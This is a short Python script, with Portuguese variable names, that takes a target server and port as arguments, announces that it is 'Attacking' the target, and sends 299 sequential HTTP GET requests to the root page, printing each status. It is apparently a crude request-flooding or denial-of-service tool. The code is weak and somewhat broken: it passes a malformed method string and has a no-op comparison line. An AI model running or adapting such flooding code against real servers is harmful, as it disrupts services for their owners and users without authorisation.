import http.client, sys, os  
servidor = sys.argv[1]
porta = sys.argv[2]
pagina = "/"
print("[ Attacking " + servidor  + " na porta " + porta + " na pagina default " + pagina + "]")
def attack():  
	conn = http.client.HTTPConnection(servidor, int(porta))
	conn.request("GET " , pagina)
	res = conn.getresponse()
	print(res.status, res.reason)
	data = res.read()
	print(len(data))
	data == b''
for i in range(1, 300):  
    attack()  
